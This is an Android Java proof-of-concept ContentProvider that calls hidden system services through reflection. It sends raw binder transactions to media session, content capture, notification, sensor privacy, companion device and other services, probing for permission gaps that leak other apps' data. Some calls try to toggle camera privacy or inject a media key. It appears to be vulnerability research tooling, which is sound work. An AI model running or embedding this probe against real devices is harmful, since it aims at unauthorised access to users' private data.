package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class CrossAppLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path == null) path = "/all";

        if (path.contains("media") || path.contains("all")) {
            testMediaSession(cursor);
        }
        if (path.contains("capture") || path.contains("all")) {
            testContentCapture(cursor);
        }
        if (path.contains("intelligence") || path.contains("all")) {
            testOnDeviceIntelligence(cursor);
        }
        if (path.contains("notify") || path.contains("all")) {
            testNotificationLeak(cursor);
        }
        if (path.contains("sensor") || path.contains("all")) {
            testSensorPrivacy(cursor);
        }
        if (path.contains("ambient") || path.contains("all")) {
            testAmbientContext(cursor);
        }
        if (path.contains("music") || path.contains("all")) {
            testMusicRecognition(cursor);
        }
        if (path.contains("companion") || path.contains("all")) {
            testCompanionDevice(cursor);
        }
        if (path.contains("translation") || path.contains("all")) {
            testTranslation(cursor);
        }
        if (path.contains("speech") || path.contains("all")) {
            testSpeechRecognition(cursor);
        }

        return cursor;
    }

    private void testMediaSession(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("media_session");
        if (binder == null) { cursor.addRow(new Object[]{"media_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"media_binder", "OK"});
        String desc = "android.media.session.ISessionManager";

        // TX=1: createSession - may allow creating a media session that can intercept controls
        // TX=2: getSessions - CRITICAL: may list all active media sessions of OTHER apps
        // TX=3: getSession2Tokens - list MediaSession2 tokens
        // TX=5: onSessionPlaystateChanged
        // TX=7: getSessionPolicies
        // TX=9: setCustomMediaKeyDispatcher (V-201 related)
        // TX=10: setCustomMediaSessionPolicyProvider

        for (int tx = 1; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                if (tx == 2 || tx == 3) {
                    // getSessions(ComponentName, int userId)
                    data.writeInt(0); // null ComponentName
                    data.writeInt(0); // userId = current
                } else if (tx == 6) {
                    // dispatchMediaKeyEvent with package
                    data.writeString(getContext().getPackageName());
                    data.writeInt(0); // asSystem=false
                    data.writeInt(1); // non-null KeyEvent
                    data.writeInt(0); // action
                    data.writeInt(85); // KEYCODE_MEDIA_PLAY_PAUSE
                } else {
                    data.writeInt(0);
                }
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    String extra = "";
                    if ((tx == 2 || tx == 3) && avail > 0) {
                        try {
                            int listSize = reply.readInt();
                            extra = " sessions=" + listSize;
                        } catch (Exception ignored) {}
                    }
                    cursor.addRow(new Object[]{"media_tx" + tx, "SUCCESS avail=" + avail + extra});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"media_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"media_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testContentCapture(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("content_capture");
        if (binder == null) { cursor.addRow(new Object[]{"capture_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"capture_binder", "OK"});
        String desc = "android.view.contentcapture.IContentCaptureManager";

        // ContentCapture can expose screen content of other apps
        // TX=1: startSession
        // TX=2: finishSession
        // TX=3: getServiceComponentName - reveals which service handles content capture
        // TX=4: removeData
        // TX=5: isContentCaptureFeatureEnabled
        // TX=6: getContentCaptureConditions
        // TX=7: getServiceSettingsActivity

        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                if (tx == 1) {
                    // startSession(IBinder activityToken, ComponentName, int sessionId, int flags, IResultReceiver)
                    data.writeStrongBinder(new android.os.Binder()); // token
                    data.writeInt(1); // non-null ComponentName
                    data.writeString(getContext().getPackageName());
                    data.writeString(".MainActivity");
                    data.writeInt(12345); // sessionId
                    data.writeInt(0); // flags
                    data.writeStrongBinder(new android.os.Binder()); // callback
                } else if (tx == 5) {
                    // isContentCaptureFeatureEnabled() — no args usually
                    // nothing extra needed
                } else {
                    data.writeInt(0);
                }
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"capture_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"capture_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"capture_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testOnDeviceIntelligence(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("on_device_intelligence");
        if (binder == null) { cursor.addRow(new Object[]{"odi_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"odi_binder", "OK"});
        String desc = "android.app.ondeviceintelligence.IOnDeviceIntelligenceManager";

        // New Android 16 service - may have permission gaps like AppFunction
        for (int tx = 1; tx <= 12; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0); // minimal
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"odi_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    String s = truncate(msg);
                    if (s.contains("ermission")) {
                        cursor.addRow(new Object[]{"odi_tx" + tx, "PERM:" + s});
                    } else {
                        cursor.addRow(new Object[]{"odi_tx" + tx, "Ex=" + ex + "|" + s});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"odi_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testNotificationLeak(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("notification");
        if (binder == null) { cursor.addRow(new Object[]{"notify_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"notify_binder", "OK"});
        String desc = "android.app.INotificationManager";

        // Key methods that might leak cross-app data:
        // getActiveNotifications - returns notifications for calling package
        // getHistoricalNotifications - notification history
        // getNotificationChannelsForPackage - get other app's notification channels
        // getActiveNotificationsFromListener - needs listener permission

        int[] interestingTx = {15, 16, 17, 18, 19, 20, 40, 41, 42, 43, 44, 45, 60, 61, 62, 63};
        for (int tx : interestingTx) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName()); // callingPkg
                data.writeInt(0);
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"notify_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    String s = truncate(msg);
                    if (s.contains("ermission") || s.contains("not allowed")) {
                        cursor.addRow(new Object[]{"notify_tx" + tx, "PERM:" + s});
                    } else {
                        cursor.addRow(new Object[]{"notify_tx" + tx, "Ex=" + ex + "|" + s});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"notify_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testSensorPrivacy(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("sensor_privacy");
        if (binder == null) { cursor.addRow(new Object[]{"sensor_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"sensor_binder", "OK"});
        String desc = "android.hardware.ISensorPrivacyManager";

        // Can we read/toggle sensor privacy (camera/mic mute) for other apps?
        for (int tx = 1; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                if (tx == 3 || tx == 4) {
                    // isSensorPrivacyEnabled(int toggleType, int sensor)
                    data.writeInt(1); // TOGGLE_TYPE_SOFTWARE
                    data.writeInt(1); // SENSOR_CAMERA
                } else if (tx == 7 || tx == 8) {
                    // setSensorPrivacy(boolean, int toggleType, int sensor)
                    data.writeInt(1); // enable
                    data.writeInt(1); // TOGGLE_TYPE_SOFTWARE
                    data.writeInt(1); // SENSOR_CAMERA
                } else {
                    data.writeInt(0);
                }
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"sensor_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    String s = truncate(msg);
                    if (s.contains("ermission")) {
                        cursor.addRow(new Object[]{"sensor_tx" + tx, "PERM:" + s});
                    } else {
                        cursor.addRow(new Object[]{"sensor_tx" + tx, "Ex=" + ex + "|" + s});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"sensor_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testAmbientContext(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("ambient_context");
        if (binder == null) { cursor.addRow(new Object[]{"ambient_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"ambient_binder", "OK"});
        String desc = "android.app.ambientcontext.IAmbientContextManager";

        // Ambient context can detect user state (driving, sleeping, etc.)
        for (int tx = 1; tx <= 8; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"ambient_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    String s = truncate(msg);
                    if (s.contains("ermission")) {
                        cursor.addRow(new Object[]{"ambient_tx" + tx, "PERM:" + s});
                    } else {
                        cursor.addRow(new Object[]{"ambient_tx" + tx, "Ex=" + ex + "|" + s});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"ambient_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testMusicRecognition(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("music_recognition");
        if (binder == null) { cursor.addRow(new Object[]{"music_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"music_binder", "OK"});
        String desc = "android.media.musicrecognition.IMusicRecognitionManager";

        // Music recognition might expose what user is listening to
        for (int tx = 1; tx <= 5; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"music_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"music_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"music_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testCompanionDevice(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("companiondevice");
        if (binder == null) { cursor.addRow(new Object[]{"companion_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"companion_binder", "OK"});
        String desc = "android.companion.ICompanionDeviceManager";

        // CompanionDevice can access notifications, call logs, etc. of associated devices
        // getAssociations - list companion device associations
        // Also can enable cross-device clipboard sync
        for (int tx = 1; tx <= 20; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                if (tx == 1 || tx == 2 || tx == 3) {
                    // getAssociations / associate / etc
                    data.writeString(getContext().getPackageName());
                    data.writeInt(android.os.Process.myUid() / 100000); // userId
                } else {
                    data.writeInt(0);
                }
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"companion_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    String s = truncate(msg);
                    if (s.contains("ermission")) {
                        cursor.addRow(new Object[]{"companion_tx" + tx, "PERM:" + s});
                    } else {
                        cursor.addRow(new Object[]{"companion_tx" + tx, "Ex=" + ex + "|" + s});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"companion_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testTranslation(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("translation");
        if (binder == null) { cursor.addRow(new Object[]{"transl_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"transl_binder", "OK"});
        String desc = "android.view.translation.ITranslationManager";

        // Translation service processes text from any app - potential text interception
        for (int tx = 1; tx <= 8; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"transl_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"transl_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"transl_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testSpeechRecognition(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("speech_recognition");
        if (binder == null) { cursor.addRow(new Object[]{"speech_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"speech_binder", "OK"});
        String desc = "android.speech.IRecognitionServiceManager";

        for (int tx = 1; tx <= 6; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"speech_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"speech_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"speech_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
